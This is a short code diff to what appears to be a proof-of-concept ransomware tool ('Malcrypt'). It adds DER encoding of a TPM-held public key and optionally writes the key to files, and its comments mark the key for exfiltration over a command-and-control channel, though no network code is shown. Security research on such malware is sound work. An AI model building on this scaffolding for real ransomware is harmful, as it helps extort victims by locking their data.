@@ -3,6 +3,7 @@
 
 #include "stdafx.h"
 
+#define WRITE_KEY
 
 int _tmain(int argc, _TCHAR* argv[])
 {
@@ -18,7 +19,19 @@ int _tmain(int argc, _TCHAR* argv[])
 	/* Output the public key (to exfiltrate). */
 	status = TlclGetPubKey(keyName, &pubKeySize, &pubKeyData);
 
+	PBYTE derPubKeyData;
+	UINT32 derPubKeySize;
+
+	/* Encode key in DER format. */
+	status = DerEncodeKey(pubKeySize, pubKeyData, &derPubKeySize, &derPubKeyData);
+
 	/* Send over C&C. */
+
+	/* Optionally write DER-encoded key. */
+#ifdef WRITE_KEY
+	PcpToolWriteFile(L"MalcryptKey0.rsa", pubKeyData, pubKeySize);
+	PcpToolWriteFile(L"MalcryptKey0.pub", derPubKeyData, derPubKeySize);
+#endif
 
 	if (!FAILED(status)) {
 		ZeroAndFree((PVOID*)&pubKeyData, pubKeySize);
